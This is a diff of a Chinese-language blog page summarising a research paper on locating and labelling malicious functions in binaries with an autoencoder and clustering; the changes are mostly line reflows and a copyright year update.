-<p><strong>转移指令</strong>3个，每个基本块<strong>内堆栈操作，寄存器操作和端口操作的数量</strong>（“stack operation”, “register operation”, and “port operation”）。这些底层特征可描述更高级别函数的<strong>传输操作</strong>，比如函数的参数和返回值是如何与函数内其余数据交互的，从而描述更复杂的逻辑和数据操作。<strong>例如去混淆、解密函数可能设计更多move-related指令，C&amp;C逻辑设计更多堆栈相关指令</strong>。因为它调用了更多的内部/外部函数。我们同样从《英特尔体系结构软件开发人员手册》中检索到了这些说明</p>
+<p><strong>(c) Transfer Instructions</strong></p>
+<p><strong>转移指令</strong>3个，每个基本块<strong>内堆栈操作，寄存器操作和端口操作的数量</strong>（“stack
+operation”, “register operation”, and “port
+operation”）。这些底层特征可描述更高级别函数的<strong>传输操作</strong>，比如函数的参数和返回值是如何与函数内其余数据交互的，从而描述更复杂的逻辑和数据操作。<strong>例如去混淆、解密函数可能设计更多move-related指令，C&amp;C逻辑设计更多堆栈相关指令</strong>。因为它调用了更多的内部/外部函数。我们同样从《英特尔体系结构软件开发人员手册》中检索到了这些说明</p>
 <p><strong>(d) API Call Categories</strong></p>
-<p><strong>API类别10个</strong>，我们使用的API调用特性是每个基本块中与**“文件系统”、“注册表”、“网络”、“DLL”、“对象”、“进程”、“服务”、“同步”、“系统信息”和“时间”相关的API调用的数量**。这些类别的灵感来自<strong>priorwork for malware clustering</strong>[18]。这些特性可用于表示执行恶意活动（如网络通信和文件系统、注册表和进程操作）所需的高级库操作。由于这些直接表示高级行为，因此它们对于理解函数的总体行为至关重要。<strong>下图显示了利用这些不同调用类型执行不同行为的恶意软件功能的示例。</strong></p>
+<p><strong>API类别10个</strong>，我们使用的API调用特性是每个基本块中与<strong>“文件系统”、“注册表”、“网络”、“DLL”、“对象”、“进程”、“服务”、“同步”、“系统信息”和“时间”相关的API调用的数量</strong>。这些类别的灵感来自<strong>priorwork
+for malware
+clustering</strong>[18]。这些特性可用于表示执行恶意活动（如网络通信和文件系统、注册表和进程操作）所需的高级库操作。由于这些直接表示高级行为，因此它们对于理解函数的总体行为至关重要。<strong>下图显示了利用这些不同调用类型执行不同行为的恶意软件功能的示例。</strong></p>
 <blockquote>
-<p><strong>[18] Scalable, Behavior-Based Malware Clustering. NDSS 2009.</strong></p>
+<p><strong>[18] Scalable, Behavior-Based Malware Clustering. NDSS
+2009.</strong></p>
 </blockquote>
-<img src="https://lzy-picture.oss-cn-beijing.aliyuncs.com/img/202304191550690.png" alt="image-20220602164417162" style="zoom:67%;">
+<p><img src="https://lzy-picture.oss-cn-beijing.aliyuncs.com/img/202304191550690.png" alt="image-20220602164417162" style="zoom:67%;"></p>
 <blockquote>
 <p>此函数用于搜索具有特定扩展名（即doc、jpg等）的各种文件。然后将这些文件复制到单独的位置。此行为可能是针对其他恶意行为的设置，如数据外泄或勒索。</p>
 </blockquote>
-<p><strong>我们认为，与经典的ACFG功能相比，这些功能更适合恶意软件</strong>，因为（1）它们包括在priorwork中用于恶意软件检测的API调用（2）<strong>指令类别更细粒度，允许每个基本块中有更多的上下文</strong>（如前所述）以及（3）<font color="red"><strong>它们不依赖太容易规避攻击的字符串</strong></font>[77]。当然，如果有一个有动机的对手，任何机器学习模型都可能受到攻击和欺骗，从而产生错误和意外的输出。虽然我们的功能和模型也不例外，但我们认为它们足以产生可靠的模型（即，其行为符合预期），并使其变得足够困难，以至于对手必须广泛地工作以产生误导性的输入（如中所示 4.7). 有关对我们系统的潜在攻击的讨论，请参阅 5.</p>
+<p><strong>我们认为，与经典的ACFG功能相比，这些功能更适合恶意软件</strong>，因为（1）它们包括在priorwork中用于恶意软件检测的API调用（2）<strong>指令类别更细粒度，允许每个基本块中有更多的上下文</strong>（如前所述）以及（3）<font color="red"><strong>它们不依赖太容易规避攻击的字符串</strong></font>[77]。当然，如果有一个有动机的对手，任何机器学习模型都可能受到攻击和欺骗，从而产生错误和意外的输出。虽然我们的功能和模型也不例外，但我们认为它们足以产生可靠的模型（即，其行为符合预期），并使其变得足够困难，以至于对手必须广泛地工作以产生误导性的输入（如中所示 4.7).
+有关对我们系统的潜在攻击的讨论，请参阅 5.</p>
 <h4><span id="2模型">（2）模型</span></h4>
-<p><strong>Autoencoder使用U-Net模型，U-Net的优点是其在编码器和解码器之间有跳过连接（skip connections），对样本x可以跳过某些特征的压缩以在重构的x’中保持更高的保真度</strong>。</p>
+<p><strong>Autoencoder使用U-Net模型，U-Net的优点是其在编码器和解码器之间有跳过连接（skip
+connections），对样本x可以跳过某些特征的压缩以在重构的x’中保持更高的保真度</strong>。</p>
 <p>首先收集大量的良性样本，对每个binary抽取上述18个静态特征用于表示该binary。设有用feature表示的样本x，AE重构后得到x’，训练的目标是最小化重构损失，即输入x和输出x’之间的损失。</p>
-<p><strong>RoI Detection会在m个基本块中检测出一些异常基本块</strong>。这些基本块分别属于不同的函数，使用例如BinaryNinja的工具就可以确定ROI属于哪些函数，即认为这些函数可能是恶意函数，也就完成了恶意函数定位的任务。<strong>后续RoI Annotation就是对这些函数聚类，完成恶意函数行为标记（分类）的任务。</strong></p>
+<p><strong>RoI
+Detection会在m个基本块中检测出一些异常基本块</strong>。这些基本块分别属于不同的函数，使用例如BinaryNinja的工具就可以确定ROI属于哪些函数，即认为这些函数可能是恶意函数，也就完成了恶意函数定位的任务。<strong>后续RoI
+Annotation就是对这些函数聚类，完成恶意函数行为标记（分类）的任务。</strong></p>
 <h4><span id="43-roi-annotation">4.3 RoI Annotation</span></h4>
 <p><strong>给定一个新样本x，我们希望识别其每个函数的行为（类别），并将其报告给Molly</strong>。由于标记所有的函数都是不实用的，所以我们只注释了少量的函数，并使用聚类分析来传播结果。</p>
-<h5><span id="1clustering-features">（1）<strong>Clustering Features</strong></span></h5>
+<h5><span id="1clusteringfeatures">（1）<strong>Clustering
+Features</strong></span></h5>
 <p>假设一组脱壳恶意软件，按上述特征提取方式（18种特征）得到每个binary的特征表示，其中一个binary为x。</p>
 <p><strong>（2）Clustering Model</strong></p>
 <p>使用PCA将特征数从18降维至5，然后使用HDBSCAN算法对5维特征聚类。</p>
@@ -3512,8 +3853,11 @@ $$</p>
 <p>接下来，Molly分析highlighted functions，从而实现：</p>
 <ul>
 <li>obtains a better perspective on what the malware is doing</li>
-<li>annotates any function labeled “unknown” with the corresponding MITRE category (dynamically updating D)</li>
-<li>observe shared relationships between other malware samples and families by their shared clusters（共享关系，分析恶意软件家族的相关性）</li>
+<li>annotates any function labeled “unknown” with the corresponding
+MITRE category (dynamically updating D)</li>
+<li>observe shared relationships between other malware samples and
+families by their shared
+clusters（共享关系，分析恶意软件家族的相关性）</li>
 </ul>
 
       
@@ -3546,7 +3890,7 @@ $$</p>
 
 <div class="copyright">
   &copy; 
-  <span itemprop="copyrightYear">2023</span>
+  <span itemprop="copyrightYear">2024</span>
   <span class="with-love">
     <i class="fa fa-heart"></i>
   </span>
